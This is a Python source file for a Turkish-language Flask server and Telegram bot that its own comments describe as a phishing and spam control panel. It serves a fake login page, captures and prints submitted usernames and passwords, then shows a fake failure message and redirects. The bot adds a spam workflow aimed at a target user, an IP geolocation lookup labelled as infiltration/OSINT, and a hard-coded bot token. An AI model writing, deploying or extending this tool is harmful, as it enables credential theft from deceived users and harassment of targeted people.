import os
import subprocess
import requests
from flask import Flask, request, render_template_string
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8265368924:AAHwCmS8esD_UzOJsJmEqb_HbOepWdELKCA"
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

RENDER_URL = "https://bd-wpu1.onrender.com"

# Webhook ayarı
bot.remove_webhook()
bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")

# Kullanıcı geçici işlem hafızası (State Management)
user_sessions = {}

# --- 1. WEB & PHISHING PANELİ ---
PHISHING_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Giriş Yap</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        .login-box h2 { margin-bottom: 20px; color: #333; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 10px; background: #007bff; border: none; color: white; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .login-box button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Oturum Aç</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Kullanıcı Adı veya E-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return "[+] Bot & Web Panel Aktif."

@app.route("/panel", methods=["GET"])
def phishing_page():
    return render_template_string(PHISHING_TEMPLATE)

@app.route("/login", methods=["POST"])
def capture_credentials():
    user = request.form.get("username")
    pwd = request.form.get("password")
    print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
    return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return '', 403


# --- 2. BUTONLU KONTROL PANELİ ---

def main_menu_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("💣 Spam Aracı", callback_data="menu_spam"),
        InlineKeyboardButton("🛠 Sızma / OSINT", callback_data="menu_pentest"),
        InlineKeyboardButton("💻 Sunucu Bilgi", callback_data="menu_info"),
        InlineKeyboardButton("❌ İptal / Sıfırla", callback_data="menu_cancel")
    )
    return markup

# Herhangi bir mesaj veya başlangıçta direkt butonlu paneli tetikle
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    chat_id = message.chat.id
    text = message.text.strip() if message.text else ""

    # Eğer kullanıcı bir işlem adımındaysa (veri giriyorsa)
    if chat_id in user_sessions and "step" in user_sessions[chat_id]:
        step = user_sessions[chat_id]["step"]

        # --- SPAM ADIMLARI ---
        if step == "waiting_spam_id":
            user_sessions[chat_id]["target_id"] = text
            user_sessions[chat_id]["step"] = "waiting_spam_text"
            bot.reply_to(message, f"🎯 Hedef ID/Kullanıcı kaydedildi: `{text}`\n\nŞimdi gönderilecek **spam mesaj içeriğini** yazın:", parse_mode="Markdown")
            return

        elif step == "waiting_spam_text":
            user_sessions[chat_id]["spam_text"] = text
            user_sessions[chat_id]["step"] = "waiting_spam_count"
            bot.reply_to(message, "✅ Mesaj içeriği alındı.\n\nKaç adet gönderilsin? (Sayı olarak yazın, örn: `10`):", parse_mode="Markdown")
            return

        elif step == "waiting_spam_count":
            try:
                count = int(text)
                target_id = user_sessions[chat_id].get("target_id")
                spam_content = user_sessions[chat_id].get("spam_text")
                
                bot.reply_to(
                    message, 
                    f"🚀 **Spam İşlemi Başlatıldı!**\n"
                    f"• Hedef ID: `{target_id}`\n"
                    f"• Mesaj: `{spam_content}`\n"
                    f"• Adet: `{count}`\n\n"
                    f"⚙️ *İşlem sıraya alındı, gönderim sağlanıyor...*", 
                    parse_mode="Markdown",
                    reply_markup=main_menu_keyboard()
                )
                user_sessions[chat_id] = {} # Oturumu sıfırla
            except ValueError:
                bot.reply_to(message, "⚠️ Lütfen geçerli bir sayı girin (Örn: 5).")
            return

        # --- IP SORGULAMA ADIMI ---
        elif step == "waiting_ip_target":
            user_sessions[chat_id] = {}
            try:
                res = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
                if res.get("status") == "success":
                    info = (
                        f"🌍 **IP Sorgu Sonucu:**\n"
                        f"• **IP:** {res.get('query')}\n"
                        f"• **Ülke:** {res.get('country')}\n"
                        f"• **Şehir:** {res.get('city')}\n"
                        f"• **ISP:** {res.get('isp')}"
                    )
                else:
                    info = "❌ IP bilgisi bulunamadı."
            except Exception as e:
                info = f"❌ Hata: {str(e)}"
            bot.reply_to(message, info, parse_mode="Markdown", reply_markup=main_menu_keyboard())
            return

        # --- TIKTOK SORGULAMA ADIMI ---
        elif step == "waiting_tt_target":
            user_sessions[chat_id] = {}
            bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{text}`\n• Durum: Profil taranıyor ve analiz ediliyor...", parse_mode="Markdown", reply_markup=main_menu_keyboard())
            return

    # Eğer aktif bir adımda değilse, her yazılanla veya /start ile ana paneli aç
    user_sessions[chat_id] = {}
    bot.reply_to(
        message,
        "👑 **C9K | Winstwo Kontrol Paneline Hoş Geldiniz** 👑\n\n"
        "Aşağıdaki butonları kullanarak işlemlerinizi seçin:",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown"
    )

# Buton Tıklama Yönetimi
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    if call.data == "menu_spam":
        user_sessions[chat_id] = {"step": "waiting_spam_id"}
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "💣 **Spam Modülü**\n\nLütfen spam atılacak **hedef kullanıcı adını veya ID'sini** yazın:")

    elif call.data == "menu_pentest":
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🌍 IP Sorgula", callback_data="tool_ip"),
            InlineKeyboardButton("📱 TikTok Bilgi", callback_data="tool_tt"),
            InlineKeyboardButton("🔙 Ana Menü", callback_data="menu_back")
        )
        bot.answer_callback_query(call.id)
        bot.edit_message_text("🛠 **Sızma ve Keşif Araçları:**", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "tool_ip":
        user_sessions[chat_id] = {"step": "waiting_ip_target"}
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "🌍 Sorgulanacak IP adresini yazın:")

    elif call.data == "tool_tt":
        user_sessions[chat_id] = {"step": "waiting_tt_target"}
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "📱 Sorgulanacak TikTok kullanıcı adını yazın:")

    elif call.data == "menu_info":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"💻 **Sunucu Durumu:**\n• Dizin: `{os.getcwd()}`\n• İşletim Sistemi: `{os.name}`", parse_mode="Markdown", reply_markup=main_menu_keyboard())

    elif call.data == "menu_cancel" or call.data == "menu_back":
        user_sessions[chat_id] = {}
        bot.answer_callback_query(call.id)
        bot.edit_message_text("👑 **Ana Menüdesiniz:**", chat_id, call.message.message_id, reply_markup=main_menu_keyboard())

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
    
